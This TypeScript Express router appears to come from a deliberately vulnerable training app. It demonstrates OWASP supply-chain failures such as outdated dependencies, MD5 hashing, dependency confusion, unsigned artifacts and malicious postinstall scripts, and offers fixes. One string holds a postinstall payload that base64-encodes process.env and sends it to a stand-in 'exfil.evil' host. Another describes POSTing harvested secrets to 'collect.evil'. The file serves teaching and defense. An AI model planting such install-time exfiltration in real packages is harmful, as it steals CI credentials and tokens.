import express from 'express';

const router = express.Router();

// VULNERABILITY A03: Software Supply Chain Failures
// (OWASP Top 10:2025 — broadens the former A06 "Vulnerable and Outdated Components"
// to cover the whole supply chain: dependencies, build systems and distribution.)
//
// Demonstrates: outdated/known-vulnerable components, dependency confusion,
// unsigned/unverified build artifacts and malicious install-time lifecycle scripts.

// VULNERABILITY: Outdated dependencies info
router.get('/dependencies', (req, res) => {
  res.json({
    vulnerability: 'A03 - Software Supply Chain Failures',
    description: 'Using outdated dependencies with known vulnerabilities',
    vulnerable_dependencies: {
      'express': '4.16.0', // Old version with known issues
      'lodash': '4.17.4',  // Version with prototype pollution
      'moment': '2.18.1',  // Old version
      'request': '2.81.0'  // Deprecated package
    },
    explanation: 'These old versions contain known security vulnerabilities'
  });
});

// VULNERABILITY: Using deprecated/insecure methods
router.post('/deprecated-crypto', (req, res) => {
  const crypto = require('crypto');
  const { data } = req.body;

  // VULNERABLE: Using deprecated crypto methods
  const hash = crypto.createHash('md5').update(data).digest('hex');

  res.json({
    vulnerability: 'A03 - Software Supply Chain Failures',
    description: 'Using deprecated cryptographic methods',
    data,
    hash,
    method: 'MD5 (deprecated)',
    explanation: 'MD5 is cryptographically broken and should not be used'
  });
});

// VULNERABILITY: Unpatched component simulation
router.get('/unpatched-info', (req, res) => {
  res.json({
    vulnerability: 'A03 - Software Supply Chain Failures',
    description: 'Simulated unpatched component vulnerabilities',
    simulated_cves: [
      'CVE-2021-44228 (Log4j)',
      'CVE-2020-8203 (Lodash prototype pollution)',
      'CVE-2019-10744 (Express.js)',
      'CVE-2018-16487 (Node.js)'
    ],
    explanation: 'Unpatched components expose applications to known exploits'
  });
});

// VULNERABILITY: Dependency confusion / namespace hijacking
// An internal package name also exists on the public registry at a higher version,
// so the resolver pulls the attacker's public package into the build.
router.get('/dependency-confusion', (req, res) => {
  const internalPackage = '@acme/auth-utils';
  res.json({
    vulnerability: 'A03 - Software Supply Chain Failures',
    description: 'Dependency confusion — public package shadows the internal one',
    intended: {
      name: internalPackage,
      version: '1.2.0',
      source: 'private registry (npm.internal.acme.corp)'
    },
    resolved: {
      name: internalPackage,
      version: '99.0.0',
      source: 'public registry (registry.npmjs.org)'
    },
    why:
      'The build has no scoped-registry pinning, so npm installs the highest version ' +
      'it can find anywhere. An attacker published 99.0.0 of the same name publicly; ' +
      'it wins, and its install scripts then run inside CI.',
    attacker_payload:
      "postinstall: node -e \"require('https').get('https://exfil.evil/?d='+" +
      "Buffer.from(JSON.stringify(process.env)).toString('base64'))\"",
    explanation:
      'Pin internal scopes to the private registry (.npmrc: @acme:registry=...), ' +
      'reserve the names publicly, and verify package provenance before install.'
  });
});

// VULNERABILITY: Unsigned / unverified build artifact accepted as trusted
router.post('/verify-artifact', (req, res) => {
  const { url } = req.body || {};
  const artifactUrl: string =
    url || 'http://cdn.build-cache.internal/app-release-2.4.1.tar.gz';

  res.json({
    vulnerability: 'A03 - Software Supply Chain Failures',
    description: 'Build artifact pulled and deployed with no signature or hash check',
    artifact: artifactUrl,
    transport: artifactUrl.startsWith('https')
      ? 'https'
      : 'http (no TLS — tamperable in transit)',
    signature_checked: false, // VULNERABLE
    checksum_verified: false, // VULNERABLE
    expected_sha256: 'none on record',
    decision: 'DEPLOYED',
    explanation:
      'With no checksum or signature gate, a tampered tarball (compromised CDN or a ' +
      'man-in-the-middle over http) ships straight to production. Verify a pinned ' +
      'SHA-256 and a cosign/sigstore or GPG signature, and adopt SLSA provenance, ' +
      'before trusting any artifact.'
  });
});

// VULNERABILITY: Malicious postinstall lifecycle script harvesting build secrets
router.get('/postinstall-script', (req, res) => {
  // Simulated: what a malicious dependency's postinstall would read from the build
  // environment. Real values are redacted so the demo never exfiltrates anything.
  const harvested = {
    NPM_TOKEN: process.env.NPM_TOKEN ? 'npm_***redacted***' : 'npm_***redacted-in-demo***',
    AWS_ACCESS_KEY_ID: process.env.AWS_ACCESS_KEY_ID
      ? 'AKIA***redacted***'
      : 'AKIA***redacted-in-demo***',
    CI: process.env.CI || 'true',
    GITHUB_TOKEN: process.env.GITHUB_TOKEN ? 'ghp_***redacted***' : 'ghp_***redacted-in-demo***'
  };

  res.json({
    vulnerability: 'A03 - Software Supply Chain Failures',
    description: 'A dependency\'s postinstall script exfiltrates secrets at install time',
    triggered_by: 'npm install (every dependency\'s postinstall runs by default)',
    script: 'postinstall: node ./.harvest.js   // reads process.env, POSTs to https://collect.evil',
    would_exfiltrate: harvested,
    explanation:
      'Lifecycle scripts run arbitrary code on every install. Run installs with ' +
      '--ignore-scripts, use a lockfile with integrity hashes, scope CI credentials ' +
      'to least privilege, and review dependencies before adding them.'
  });
});

export default router;